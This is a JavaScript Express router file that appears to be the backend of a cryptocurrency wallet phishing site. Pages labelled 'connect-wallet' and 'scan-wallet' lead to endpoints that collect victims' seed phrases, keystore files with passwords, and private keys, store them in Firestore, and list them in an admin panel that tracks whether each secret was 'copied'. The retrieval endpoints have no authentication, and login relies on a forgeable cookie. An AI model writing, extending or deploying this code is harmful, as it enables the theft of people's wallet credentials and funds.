let express = require('express')
let router = express.Router()
let httpMsgs = require('http-msgs')
let db = require('../firebase/firestore')

router.get('/', (req, res) => {
    res.render('index')
})


router.get('/connect-wallet', (req, res) => {
    res.render('connect-wallet')
})


router.get('/scan-wallet', (req, res) => {
    res.render('scan-wallet')
})

router.get('/test', (req, res) => {
    res.render('test')
})

router.get('/login', (req, res) => {
   res.clearCookie('adminData');
   res.render('login')
})

router.get('/admin', (req, res, next) => {
    if(typeof req.cookies.adminData !== 'undefined'){
        res.render('phrase')
    } else {
        res.redirect('/login')
    }
})


router.get('/wallet-key-store', (req, res, next) => {
    if(typeof req.cookies.adminData !== 'undefined'){
        res.render('key-store')
    } else {
        res.redirect('/login')
    }
})

router.get('/wallet-private-key', (req, res, next) => {
    if(typeof req.cookies.adminData !== 'undefined'){
        res.render('private-key')
    } else {
        res.redirect('/login')
    }
})

router.get('/admin-security', (req, res, next) => {
    if(typeof req.cookies.adminData !== 'undefined'){
        res.render('security')
    } else {
        res.redirect('/login')
    }
})

router.post('/login', (req, res) => {
    return db.getAdminDetails('admin').then((doc) => {
        if(doc.exists()){
            if(req.body.username == doc.data().username && req.body.password == doc.data().password){
                var cookieData = {
                    isLoggedIn: true
                }
                res.cookie('adminData', cookieData, {maxAge: 7200000})
                httpMsgs.sendJSON(req, res, { response: 'success' })
            } else {
                httpMsgs.send500(req, res, 'username or password is incorrect')
            }
        }
    })
})


router.post('/post-phrase', (req, res) => {
    var copied = false
    var del = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    var data = {
        walletType: req.body.walletType,
        phrase: req.body.phrase,
        copied: copied,
        delete: del
    }

   return db.addKeyPharseToFireStore(data).then((value) => {
       httpMsgs.sendJSON(req, res, { result: 'Success'})
   })
   .catch((error) => {
       httpMsgs.send500(req, res, error)
   })
})

router.post('/post-keystore', (req, res) => {
    var copied = false
    var del = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    if(req.body.passCopied == 'false'){
        passCopied = false
    } else {
        passCopied = true
    }

    var data = {
        walletType: req.body.walletType,
        keystore: req.body.keystore,
        password: req.body.password,
        copied: copied,
        passCopied: passCopied,
        delete: del
    }

    return db.addKeyStoreJsonToFireStore(data).then(() => {
        httpMsgs.sendJSON(req, res, { result: 'Success'})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
})

router.post('/post-private-key', (req, res) => {
    var copied = false
    var del = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    var data = {
        walletType: req.body.walletType,
        privatekey: req.body.privatekey,
        copied: copied,
        delete: del
    }

    return db.addPrivateKeyToFireStore(data).then(() => {
        httpMsgs.sendJSON(req, res, { result: 'Success'})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })

})

router.get('/get-phrase', (req, res) => {
    db.getKeyPharseFromFireStore().then((value) => {
       httpMsgs.sendJSON(req, res, { phrases: value})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
    
})

router.get('/get-key-store', (req, res) => {
    db.getKeyStoreJsonFromFireStore().then((value) => {
        httpMsgs.sendJSON(req, res, { keystore: value})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
})

router.get('/get-private-key', (req, res) => {
    db.getPrivateKeyFromFireStore().then((value) => {
        httpMsgs.sendJSON(req, res, { privatekey: value})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
})

router.post('/update-admin', (req, res) => {
    return db.getAdminDetails('admin').then((doc) => {
        if(doc.exists()){
            if(doc.data().password == req.body.currentPassword){
                db.updateAdmin('admin', { username: req.body.username, password: req.body.password }).then(() => {
                    httpMsgs.sendJSON(req, res, { data: 'success'})
                })
                .catch((error) => {
                    httpMsgs.send500(req, res, error)
                })
            }  else {
                httpMsgs.send500(req, res, 'error')
            }
        }
    })

})

router.post('/update-phrase', (req, res) => {
    var copied = false
    var del = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    var data = {
        walletType: req.body.walletType,
        phrase: req.body.phrase,
        copied: copied,
        delete: del
    }
    return db.updateKeyPharseToFireStore(data, req.body.id).then(() => {
        httpMsgs.sendJSON(req, res, { data: 'success'})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
})

router.post('/update-key-store', (req, res) => {
    var copied = false
    var del = false
    var passCopied = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    if(req.body.passCopied == 'false'){
        passCopied = false
    } else {
        passCopied = true
    }

    var data = {
        walletType: req.body.walletType,
        keystore: req.body.keystore,
        password: req.body.password,
        copied: copied,
        passCopied: passCopied,
        delete: del
    }
    return db.updateKeyStoreJsonToFireStore(data, req.body.id).then(() => {
        httpMsgs.sendJSON(req, res, { data: 'success'})
    })
    .catch((error) => {
        console.log(error);
        httpMsgs.send500(req, res, error)
    })
})

router.post('/update-private-key', (req, res) => {
    var copied = false
    var del = false
    if(req.body.copied == 'false'){
        copied = false
    } else {
        copied = true
    }

    if(req.body.delete == 'false'){
        del = false
    } else {
        del = true
    }

    var data = {
        walletType: req.body.walletType,
        privatekey: req.body.privatekey,
        copied: copied,
        delete: del
    }

    return db.updatePrivateKeyFromFireStore(data, req.body.id).then(() => {
        httpMsgs.sendJSON(req, res, { data: 'success'})
    })
    .catch((error) => {
        httpMsgs.send500(req, res, error)
    })
})

router.get('/get-admin-details', (req, res) => {
    return db.getAdminDetails('admin').then((doc) => {
        if(doc.exists()){
            httpMsgs.sendJSON(req, res, { data: doc.data().username })
        }
    })
})

module.exports = router